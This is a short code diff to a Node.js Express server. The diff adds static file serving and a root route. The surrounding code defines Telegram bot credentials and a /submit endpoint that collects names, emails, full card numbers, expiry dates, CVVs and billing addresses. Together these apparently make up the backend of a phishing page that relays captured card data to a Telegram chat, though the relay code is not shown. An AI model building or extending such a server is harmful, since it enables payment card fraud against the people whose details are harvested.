@@ -1,5 +1,6 @@
 const express = require('express');
 const bodyParser = require('body-parser');
+const path = require('path');
 const fetch = require('node-fetch');
 
 const app = express();
@@ -10,7 +11,14 @@ const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
 const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';
 
 app.use(bodyParser.json());
+
+// Serve static files from the "public" directory
 app.use(express.static('public'));
+
+// Serve index.html on the root route
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
 
 app.post('/submit', (req, res) => {
     const { name, email, creditCard, expDate, cvv, billingAddress } = req.body;
